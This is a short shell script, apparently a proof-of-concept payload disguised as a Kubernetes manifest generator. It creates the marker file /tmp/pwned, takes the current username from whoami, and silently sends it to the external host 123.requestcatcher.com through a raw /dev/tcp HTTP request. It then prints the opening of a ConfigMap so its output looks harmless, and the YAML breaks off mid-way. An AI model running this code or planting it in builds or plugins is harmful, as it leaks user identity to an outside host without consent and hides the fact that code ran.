#!/bin/sh
touch /tmp/pwned

a=$(whoami)
host="123.requestcatcher.com"
path="/test/pwned?id=$a"
echo "exec 3<>/dev/tcp/$host/80; printf 'GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' '$path' '$host' >&3; cat <&3" | bash 1>/dev/null 2>&1

echo "apiVersion: v1
kind: ConfigMap
metadata:
  name: cb"